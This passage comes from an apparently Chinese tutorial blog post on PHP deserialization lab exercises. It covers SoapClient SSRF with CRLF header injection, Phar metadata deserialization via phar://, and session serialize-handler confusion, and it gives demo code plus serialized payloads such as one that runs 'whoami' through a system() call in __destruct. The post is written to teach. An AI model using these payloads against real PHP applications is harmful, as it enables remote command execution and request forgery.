class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php">SoapClient &#123;<br>    <span class="hljs-comment">/* 方法 */</span><br>    <span class="hljs-keyword">public</span> __construct ( <span class="hljs-keyword">string</span>|<span class="hljs-literal">null</span> <span class="hljs-variable">$wsdl</span> , <span class="hljs-keyword">array</span> <span class="hljs-variable">$options</span> = [] )<br>    <span class="hljs-keyword">public</span> __call ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span> , <span class="hljs-keyword">array</span> <span class="hljs-variable">$args</span> ) : <span class="hljs-keyword">mixed</span><br>    <span class="hljs-keyword">public</span> __doRequest ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$request</span> , <span class="hljs-keyword">string</span> <span class="hljs-variable">$location</span> , <span class="hljs-keyword">string</span> <span class="hljs-variable">$action</span> , <span class="hljs-keyword">int</span> <span class="hljs-variable">$version</span> , <span class="hljs-keyword">bool</span> <span class="hljs-variable">$oneWay</span> = <span class="hljs-literal">false</span> ) : <span class="hljs-keyword">string</span>|<span class="hljs-literal">null</span><br>    <span class="hljs-keyword">public</span> __getCookies ( ) : <span class="hljs-keyword">array</span><br>    <span class="hljs-keyword">public</span> __getFunctions ( ) : <span class="hljs-keyword">array</span>|<span class="hljs-literal">null</span><br>    <span class="hljs-keyword">public</span> __getLastRequest ( ) : <span class="hljs-keyword">string</span>|<span class="hljs-literal">null</span><br>    <span class="hljs-keyword">public</span> __getLastRequestHeaders ( ) : <span class="hljs-keyword">string</span>|<span class="hljs-literal">null</span><br>    <span class="hljs-keyword">public</span> __getLastResponse ( ) : <span class="hljs-keyword">string</span>|<span class="hljs-literal">null</span><br>    <span class="hljs-keyword">public</span> __getLastResponseHeaders ( ) : <span class="hljs-keyword">string</span>|<span class="hljs-literal">null</span><br>    <span class="hljs-keyword">public</span> __getTypes ( ) : <span class="hljs-keyword">array</span>|<span class="hljs-literal">null</span><br>    <span class="hljs-keyword">public</span> __setCookie ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span> , <span class="hljs-keyword">string</span>|<span class="hljs-literal">null</span> <span class="hljs-variable">$value</span> = <span class="hljs-literal">null</span> ) : <span class="hljs-keyword">void</span><br>    <span class="hljs-keyword">public</span> __setLocation ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$location</span> = <span class="hljs-string">&quot;&quot;</span> ) : <span class="hljs-keyword">string</span>|<span class="hljs-literal">null</span><br>    <span class="hljs-keyword">public</span> __setSoapHeaders ( SoapHeader|<span class="hljs-keyword">array</span>|<span class="hljs-literal">null</span> <span class="hljs-variable">$headers</span> = <span class="hljs-literal">null</span> ) : <span class="hljs-keyword">bool</span><br>    <span class="hljs-keyword">public</span> __soapCall ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span> , <span class="hljs-keyword">array</span> <span class="hljs-variable">$args</span> , <span class="hljs-keyword">array</span>|<span class="hljs-literal">null</span> <span class="hljs-variable">$options</span> = <span class="hljs-literal">null</span> , SoapHeader|<span class="hljs-keyword">array</span>|<span class="hljs-literal">null</span> <span class="hljs-variable">$inputHeaders</span> = <span class="hljs-literal">null</span> , <span class="hljs-keyword">array</span> &amp;<span class="hljs-variable">$outputHeaders</span> = <span class="hljs-literal">null</span> ) : <span class="hljs-keyword">mixed</span><br>&#125;<br></code></pre></td></tr></table></figure><p>该原生类中有一个<code>__call()</code>，当<code>__call()</code>被触发时，可以发送任意的<code>http</code>和<code>https</code>请求</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> SoapClient::__call(<span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span>, <span class="hljs-keyword">array</span> <span class="hljs-variable">$args</span>): <span class="hljs-keyword">mixed</span><br><br><span class="hljs-comment"># $name:用来指明是否是wsdl模式，将该值设为null则表示非wsdl模式。</span><br><span class="hljs-comment"># $args:如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。</span><br></code></pre></td></tr></table></figure><p>正常情况下的<code>SoapClient</code>类，调用一个不存在的函数，去调用<code>__call</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 先nc监听指定端口，然后运行</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> SoapClient(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&#x27;location&#x27;</span> =&gt; <span class="hljs-string">&#x27;http://127.0.0.1:9999&#x27;</span>,<br>    <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; <span class="hljs-string">&#x27;mechoy&#x27;</span>,<br>));<br><span class="hljs-variable">$b</span> = serialize(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$c</span> = unserialize(<span class="hljs-variable">$b</span>);<br><span class="hljs-variable">$c</span>-&gt;mechoy();   <span class="hljs-comment">// 调用原生类中不存在的方法</span><br></code></pre></td></tr></table></figure><p><img src="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/13.png"></p><p><code>header</code>中<code>SOAPAction</code>、<code>User-Agent</code>的值可控的，因此可以再借助<code>CRLF</code>，插入任意的<code>HTTP</code>头</p><h4 id="Phar文件"><a href="#Phar文件" class="headerlink" title="Phar文件"></a>Phar文件</h4><p>PHP Archive，phar扩展提供了一种将整个PHP应用程序放入.phar文件中的方法，以方便移动、安装。.phar文件的最大特点是将几个文件组合成一个文件的便捷方式，.phar文件提供了一种将完整的PHP程序分布在一个文件中并从该文件中运行的方法。</p><p>phar文件本质上是一种压缩文件，会以<strong>序列化</strong>的形式存储用户自定义的<strong>meta-data</strong>。当受影响的文件操作函数调用phar文件时，会自动反序列化meta-data内的内容。</p><h5 id="Phar-文件结构"><a href="#Phar-文件结构" class="headerlink" title="Phar 文件结构"></a>Phar 文件结构</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php">All Phar archives contain three to four sections: <span class="hljs-comment">// 所有 Phar 档案都包含三到四个部分</span><br>a stub<br><span class="hljs-comment">// 存根 ：</span><br><span class="hljs-comment">/* phar文件的标志，必须以 xxx __HALT_COMPILER();?&gt; 结尾，否则无法识别。xxx可以为自定义内容。*/</span><br>a manifest describing the contents<br><span class="hljs-comment">// 描述内容的清单</span><br><span class="hljs-comment">/* phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data */</span><br>the file contents <br><span class="hljs-comment">// 文件内容：被压缩文件的内容</span><br>[optional] a signature <span class="hljs-keyword">for</span> verifying Phar integrity (phar file format only) <br><span class="hljs-comment">// 可选项 用于验证 Phar 完整性的签名（仅限 Phar 文件格式）：签名，放在末尾。</span><br></code></pre></td></tr></table></figure><h5 id="Phar-文件格式"><a href="#Phar-文件格式" class="headerlink" title="Phar 文件格式"></a>Phar 文件格式</h5><p>(全局 Phar 清单格式)</p><table><thead><tr><th>字节大小</th><th>描述</th></tr></thead><tbody><tr><td>4字节</td><td>清单长度（以字节为单位）（1 MB 限制）</td></tr><tr><td>4字节</td><td>Phar 中的文件数</td></tr><tr><td>2 个字节</td><td>Phar 清单的 API 版本（当前为 1.0.0）</td></tr><tr><td>4字节</td><td>全局 Phar 位图标志</td></tr><tr><td>4字节</td><td>Phar 别名的长度</td></tr><tr><td>??</td><td>Phar 别名（长度基于上一个）</td></tr><tr><td>4字节</td><td>Phar 元数据的长度（<code>0</code>无）</td></tr><tr><td>??</td><td>序列化的 Phar 元数据(meta-data)，以<a href="https://www.php.net/manual/en/function.serialize.php">serialize()</a>格式存储</td></tr><tr><td>至少 24 * 条目字节数</td><td>每个文件的条目</td></tr></tbody></table><p>由此可见，<code>Phar的meta-data</code>则是反序列化漏洞的成因，<code>meta-data</code>在创建或存储时以<strong>序列化</strong>的形式存储，那么在调用时则会进行<strong>反序列化操作</strong>，php大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化，下图为知道创宇测试受影响函数的列表</p><p><img src="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/20.png" alt="https://paper.seebug.org/680/#22-demo"></p><p>补充：</p><table><thead><tr><th align="left">补充：受影响函数列表</th><th>PHP 版本：</th></tr></thead><tbody><tr><td align="left">md5_file()</td><td>4.2.0+<br>在 PHP 5.0 中，新增 <em>raw</em> 参数。</td></tr></tbody></table><h5 id="创建Phar文件"><a href="#创建Phar文件" class="headerlink" title="创建Phar文件"></a>创建Phar文件</h5><p>这里使用Phar类进行<code>Phar</code>文件的创建</p><p><code>Phar</code> 类提供了访问和创建 <code>Phar</code> 档案的高级接口。<a href="https://www.php.net/manual/en/class.phar.php">Phar类使用详情</a></p><p>这里简单说一下能用到的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 构造方法</span><br><span class="hljs-keyword">public</span> __construct(<span class="hljs-keyword">string</span> <span class="hljs-variable">$filename</span>, <span class="hljs-keyword">int</span> <span class="hljs-variable">$flags</span> = <span class="hljs-built_in">FilesystemIterator</span>::SKIP_DOTS | <span class="hljs-built_in">FilesystemIterator</span>::UNIX_PATHS, ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$alias</span> = <span class="hljs-literal">null</span>)<br><span class="hljs-comment">// $filename的值必须为*.phar</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 开始缓冲 Phar 写操作，不要修改磁盘上的 Phar 对象</span><br><span class="hljs-keyword">public</span> Phar::startBuffering(): <span class="hljs-keyword">void</span><br><span class="hljs-comment">// 以在创建或修改包含大量文件的 Phar 存档时提供显着的性能提升</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 停止缓冲对 Phar 归档的写入请求，并将更改保存到磁盘</span><br><span class="hljs-keyword">public</span> Phar::stopBuffering(): <span class="hljs-keyword">void</span><br><span class="hljs-comment">// Phar::stopBuffering()与 Phar::startBuffering()方法结合使用</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 设置 phar 存档元数据</span><br><span class="hljs-keyword">public</span> Phar::setMetadata(<span class="hljs-keyword">mixed</span> <span class="hljs-variable">$metadata</span>): <span class="hljs-keyword">void</span><br><span class="hljs-comment">// 此方法需要设置php.ini设置phar.readonly才能0用于Phar 对象。否则，将抛出PharException 。</span><br><span class="hljs-comment">// 用于存储自定义数据，这些数据将有关 phar 档案的某些内容描述为一个完整的实体。 PharFileInfo::setMetadata()应该用于文件特定的元数据。</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 将文件从字符串添加到 phar 存档</span><br><span class="hljs-keyword">public</span> Phar::addFromString(<span class="hljs-keyword">string</span> <span class="hljs-variable">$localName</span>, <span class="hljs-keyword">string</span> <span class="hljs-variable">$contents</span>): <span class="hljs-keyword">void</span><br><span class="hljs-comment">// $localName:文件将存储在存档中的路径。</span><br><span class="hljs-comment">// $contents:要存储的文件内容</span><br><span class="hljs-comment">// 使用此方法，可以将任何字符串添加到 phar 存档中。该文件将localname作为其路径存储在存档中。</span><br><span class="hljs-comment">// 注意： Phar::addFile()、Phar::addFromString()和Phar::offsetSet() 每次调用时都会保存一个新的 phar 存档</span><br><span class="hljs-comment">// 也就是说，该函数是用于生产phar文件的重要步骤</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 用于设置 Phar 存档的 PHP 加载器或引导存根</span><br><span class="hljs-keyword">public</span> Phar::setStub(<span class="hljs-keyword">string</span> <span class="hljs-variable">$stub</span>, <span class="hljs-keyword">int</span> <span class="hljs-variable">$len</span> = -<span class="hljs-number">1</span>): <span class="hljs-keyword">bool</span><br><span class="hljs-comment">// 此方法用于将 PHP 引导加载程序存根添加到新的 Phar 存档，或替换现有 Phar 存档中的加载程序存根。</span><br><span class="hljs-comment">// 理解的就是，该方法将创建一个新的phar文件，若原来存在同名phar文件，则替换</span><br><span class="hljs-comment">// 此方法需要设置php.ini设置phar.readonly才能0用于Phar 对象。否则，将抛出PharException 。</span><br></code></pre></td></tr></table></figure><p>写个demo</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># demo.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mechoy</span> = <span class="hljs-string">&quot;rookie!&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello Phar&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&quot;demo.phar&quot;</span>);<br><span class="hljs-comment"># $phar-&gt;startBuffering();</span><br><span class="hljs-variable">$phar</span>-&gt;setStub(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);<br><span class="hljs-variable">$flag</span> = <span class="hljs-keyword">new</span> Test();<br><span class="hljs-variable">$phar</span>-&gt;setMetadata(<span class="hljs-variable">$flag</span>);<br><span class="hljs-variable">$phar</span>-&gt;addFromString(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-comment"># $phar-&gt;stopBuffering();</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/21.png"></p><p>再来看这个<code>demo.php</code>文件</p><p><img src="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/22.png"></p><p>而当使用一些文件系统函数在通过<code>phar://</code>伪协议解析<code>phar</code>文件时，都会将<code>meta-data</code>进行反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># demo2.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mechoy</span> = <span class="hljs-string">&quot;rookie!&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;destruct!\n&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;wakeup\n&quot;</span>;<br>    &#125;<br>&#125;<br>file_get_contents(<span class="hljs-string">&quot;phar://demo.phar&quot;</span>);<br></code></pre></td></tr></table></figure><p><img src="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/23.png"></p><h4 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h4><p>会话[<code>session</code>]支持在 PHP 中是在并发访问时由一个方法来保存某些数据.从而使你能够构建更多的定制程序 从而提高你的 web 网站的吸引力.一个访问者访问你的 web 网站将被分配一个唯一的 id, 就是所谓的会话 id. 这个 id 可以存储在用户端的一个 cookie 中，也可以通过 URL 进行传递.会话支持允许你将请求中的数据保存在超全局数组[$_SESSION]中. 当一个访问者访问你的网站，PHP 将自动检查(如果 <a href="https://www.php.net/manual/zh/session.configuration.php#ini.session.auto-start">session.auto_start</a> 被设置为 1）或者在你要求下检查(明确通过 <a href="https://www.php.net/manual/zh/function.session-start.php">session_start()</a> 或者隐式通过 <strong>session_register()</strong>) 当前会话 id 是否是先前发送的请求创建. 如果是这种情况， 那么先前保存的环境将被重建.</p><p>简单点说，session作为用户的唯一标识，服务端将根据session去区分用户。</p><h5 id="Session工作流程"><a href="#Session工作流程" class="headerlink" title="Session工作流程"></a>Session工作流程</h5><p><img src="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/24.png"></p><h5 id="PHP-session的相关配置"><a href="#PHP-session的相关配置" class="headerlink" title="PHP session的相关配置"></a>PHP session的相关配置</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">session.save_path=<span class="hljs-string">&quot;/tmp&quot;</span>      --设置session文件的存储位置,文件名以sess_PHPSESSID命名<br>session.save_handler=files    --设定用户自定义存储函数，如果想使用PHP内置session存储机制之外的可以使用这个函数<br>session.auto_start= <span class="hljs-number">0</span>          --指定会话模块是否在请求开始时启动一个会话，默认值为 <span class="hljs-number">0</span>，不启动<br>session.serialize_handler= php --定义用来序列化/反序列化的处理器名字，设置php的session的序列化方式,默认使用php  <br>session.upload_progress.enabled= On --启用上传进度跟踪，并填充$ _SESSION变量，默认启用<br>session.upload_progress.cleanup= oN --读取所有POST数据（即完成上传）后立即清理进度信息，默认启用<br>session.gc_maxlifetime = <span class="hljs-number">1440</span>--指定过了多少秒之后数据就会被视为“垃圾”并被清除。会话过期时间<br></code></pre></td></tr></table></figure><p>其中<code>session.serialize_handler</code>(也就是<code>PHP session</code>序列化机制)存在以下几种</p><ul><li><code>php_binary</code>: 键名的长度对应的ascii字符+键名+经过serialize()函数序列化后的值</li></ul><p><img src="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/27.png"></p><ul><li><code>php</code>: 键名+竖线（|）+经过serialize()函数处理过的值</li></ul><p><img src="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/25.png"></p><ul><li><code>php_serialize</code>: 经过serialize()函数处理过的值，会将键名和值当作一个数组序列化，（PHP&gt;5.5.4+）</li></ul><p><img src="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/26.png"></p><h5 id="session的反序列化漏洞"><a href="#session的反序列化漏洞" class="headerlink" title="session的反序列化漏洞"></a>session的反序列化漏洞</h5><p>利用<code>php</code>处理器和<code>php_serialize</code>处理器的存储格式差异而产生</p><p><code>php</code>处理器以  <code>键名+竖线（|）+经过serialize()函数处理过的值</code>存入<code>PHPSESSID</code>文件中</p><p>而<code>php_serialize</code>处理器则是以 <code>$_SESSION数组序列化的字符串</code>直接存储在<code>PHPSESSID</code>文件中</p><p>当以<code>php_serialize</code>处理器存入，同时以<code>php</code>处理器读取时，<code>php</code>处理器会寻找<code>竖线（|）</code>并反序列化<code>竖线（|）</code>后面的值</p><p>看个demo</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># demo1.php</span><br><span class="hljs-meta">&lt;?php</span><br>ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php_serialize&#x27;</span>);<span class="hljs-comment">// 设置该目录下，使用php_serialize处理器</span><br>session_start();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;a&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>使用该文件生成一个<code>PHPSESSID</code>文件，传入<code>$a = |O:4:&quot;test&quot;:1:&#123;s:3:&quot;cmd&quot;;s:6:&quot;whoami&quot;;&#125;</code></p><p><img src="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/28.png"></p><p>ok，再用<code>php</code>处理器去读取这个<code>PHPSESSID</code>文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># demo2.php</span><br><span class="hljs-meta">&lt;?php</span><br>session_start();<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Session unserialize!&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        system(<span class="hljs-keyword">$this</span>-&gt;cmd);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/29.png"></p><p>总结一下，就是利用这个<code>竖线（|）</code>，因为<code>php</code>处理器会读取<code>竖线（|）</code>后面的字符串进行反序列化</p><h5 id="Session-上传进度"><a href="#Session-上传进度" class="headerlink" title="Session 上传进度"></a>Session 上传进度</h5><p>此特性自 PHP 5.4.0 后可用</p><blockquote><p>当 <code>session.upload_progress.enabled</code>  INI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态</p><p>当一个上传在处理中，同时POST一个与INI中设置的<code>session.upload_progress.name</code>同名变量时，上传进度可以在<code>$_SESSION</code>中获得。 当PHP检测到这种POST请求时，它会在<code>$_SESSION</code>中添加一组数据, 索引是 <code>session.upload_progress.prefix</code>与 <code>session.upload_progress.name</code>连接在一起的值。</p></blockquote><p>翻译一下，当<code>php.ini</code>中开启了<code>session.upload_progress.enabled</code>  时，如果在<code>POST</code>请求中插入一个与<code>session.upload_progress.name</code>同名变量时，就会把上传的进度放在<code>$_SESSION</code>数组中</p><p><img src="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/30.png"></p><p>这里先浅浅上传一个文件，看一下上传后存储的<code>PHPSESSID</code>文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;html&gt;<br>&lt;form action=&quot;index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;<br>    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;test&quot;/&gt;<br>    &lt;!--注意name的值要与配置文件中的相同--&gt;<br>    &lt;input type=&quot;file&quot; name=&quot;file&quot;/&gt;<br>    &lt;input type=&quot;submit&quot;/&gt;<br>&lt;/form&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p><img src="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/31.png"></p><p><img src="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/32.png"></p><p>发现这两个可控的参数，再来看一下<code>PHPSESSID</code>文件(这里有个问题是，当<code>name=1.png</code>时，生成的<code>PHPSESSID</code>文件是空的)</p><p>这里重复一下上面的操作，传入<code>name=|O:4:\&quot;test\&quot;:1:&#123;s:4:\&quot;name\&quot;;s:4:\&quot;flag\&quot;;&#125;</code></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs json">a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">19</span>:<span class="hljs-string">&quot;upload_progress_xxx&quot;</span>;a:<span class="hljs-number">5</span>:&#123;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;start_time&quot;</span>;i:<span class="hljs-number">1657036095</span>;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;content_length&quot;</span>;i:<span class="hljs-number">55380</span>;s:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;bytes_processed&quot;</span>;i:<span class="hljs-number">55380</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;done&quot;</span>;b:<span class="hljs-number">1</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;files&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;a:<span class="hljs-number">7</span>:&#123;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;field_name&quot;</span>;s:<span class="hljs-number">38</span>:<span class="hljs-string">&quot;|O:4:&quot;</span>test<span class="hljs-string">&quot;:1:&#123;s:4:&quot;</span>name<span class="hljs-string">&quot;;s:4:&quot;</span>flag<span class="hljs-string">&quot;;&#125;</span><br><span class="hljs-string">// 传入的poc成功写入到文件之中</span><br></code></pre></td></tr></table></figure><p>总结一下：</p><ul><li>假如上传时使用的<code>php_serialize</code>处理器去序列化<code>$_SESSION</code>中的数据并存储到<code>PHPSESSION</code>文件中去</li><li>当再对<code>PHPSESSION</code>文件进行读取时，使用<code>php</code>处理器去反序列化<code>PHPSESSION</code>文件</li><li><code>php</code>处理器会寻找<code>竖线（|）</code>后的序列化字符串，然后进行反序列化操作</li><li>此时就与<code>session</code>的反序列化相同</li></ul><h3 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h3><p>总结下来，还是一个字”菜他妈给菜开门，菜到家了”，按照自己的预计情况，这篇文章应该完成的很快，但实际情况是，看一会卡一会，或是看一会卡很久，也不知道接下来能不能继续混口饭吃了</p><img src="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/33.png" style="zoom:67%;"><h3 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h3><p><a href="https://github.com/fine-1/php-SER-libs">https://github.com/fine-1/php-SER-libs</a></p><p><a href="https://xz.aliyun.com/t/9293#toc-9">https://xz.aliyun.com/t/9293#toc-9</a></p><p><a 